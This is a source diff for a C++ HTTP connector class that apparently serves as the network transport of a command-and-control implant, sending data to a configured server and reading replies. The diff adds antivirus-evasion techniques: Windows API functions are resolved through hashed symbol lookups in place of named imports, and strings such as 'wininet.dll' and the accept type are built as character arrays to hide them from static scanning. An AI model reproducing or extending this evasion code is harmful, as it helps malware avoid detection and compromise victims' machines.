@@ -1,5 +1,8 @@
 #include "ConnectorHTTP.h"
 #include "utils.h"
+#include "ApiLoader.h"
+#include "ApiDefines.h"
+#include "ProcLoader.h"
 
 BOOL _isdigest(char c)
 {
@@ -34,27 +37,27 @@ int _atoi(const char* str)
 
 ConnectorHTTP::ConnectorHTTP()
 {
-	decltype(LocalAlloc)* alloc = LocalAlloc;
-	this->functions = (HTTPFUNC*) alloc(LPTR, sizeof(HTTPFUNC) );
+	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC) );
 	
-	this->functions->LocalAlloc     = alloc;
-	this->functions->LocalReAlloc   = LocalReAlloc;
-	this->functions->LocalFree      = LocalFree;
-	this->functions->GetProcAddress = GetProcAddress;
-	this->functions->LoadLibraryA   = LoadLibraryA;
+	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
+	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
+	this->functions->LocalFree    = ApiWin->LocalFree;
+	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
+	this->functions->GetLastError = ApiWin->GetLastError;
 
-	HMODULE hWininetModule = this->functions->LoadLibraryA("wininet.dll");
+	CHAR wininet_c[] = { 'w', 'i', 'n', 'i', 'n', 'e', 't', '.', 'd', 'l', 'l', 0 };
+	HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
 	if (hWininetModule) {
-		this->functions->InternetOpenA              = (decltype(InternetOpenA)*) this->functions->GetProcAddress(hWininetModule, "InternetOpenA");
-		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)this->functions->GetProcAddress(hWininetModule, "InternetConnectA");
-		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)this->functions->GetProcAddress(hWininetModule, "HttpOpenRequestA");
-		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)this->functions->GetProcAddress(hWininetModule, "HttpSendRequestA");
-		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)this->functions->GetProcAddress(hWininetModule, "InternetSetOptionA");
-		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)this->functions->GetProcAddress(hWininetModule, "InternetQueryOptionA");
-		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)this->functions->GetProcAddress(hWininetModule, "HttpQueryInfoA");
-		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*)this->functions->GetProcAddress(hWininetModule, "InternetQueryDataAvailable");
-		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)this->functions->GetProcAddress(hWininetModule, "InternetCloseHandle");
-		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)this->functions->GetProcAddress(hWininetModule, "InternetReadFile");
+		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
+		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
+		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
+		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
+		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
+		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
+		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
+		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
+		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
+		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
 	}
 }
 
@@ -68,10 +71,6 @@ void ConnectorHTTP::SetConfig( BOOL Ssl, CHAR* UserAgent, CHAR* Method, CHAR* Ad
 	this->headers        = Headers;
 	this->user_agent     = UserAgent;
 }
-
-HINTERNET hInternet = NULL;
-HINTERNET hConnect  = NULL;
-
 
 BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 {
@@ -89,7 +88,8 @@ BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 			hConnect = this->functions->InternetConnectA(hInternet, this->server_address, this->server_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);
 		if ( hConnect ) 
 		{
-			LPCSTR rgpszAcceptTypes[] = { "*/*", 0 };
+			CHAR acceptTypes[] = { '*', '/', '*', 0 };
+			LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
 			DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
 			if ( this->ssl )
 				flags |= INTERNET_FLAG_SECURE;
@@ -137,7 +137,7 @@ BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 								recv = buffer;
 							}
 						}
-						else if ( GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND ) {
+						else if (this->functions->GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
 							ULONG numberReadedBytes = 0;
 							DWORD readedBytes = 0;
 							BYTE* buffer = (BYTE*) this->functions->LocalAlloc(LPTR, 0);
@@ -171,4 +171,10 @@ BYTE* ConnectorHTTP::SendData(BYTE* data, ULONG data_size, ULONG* recv_size)
 		}
 	}
 	return recv;
+}
+
+void ConnectorHTTP::CloseConnector()
+{
+	this->functions->InternetCloseHandle(hInternet);
+	this->functions->InternetCloseHandle(hConnect);
 }
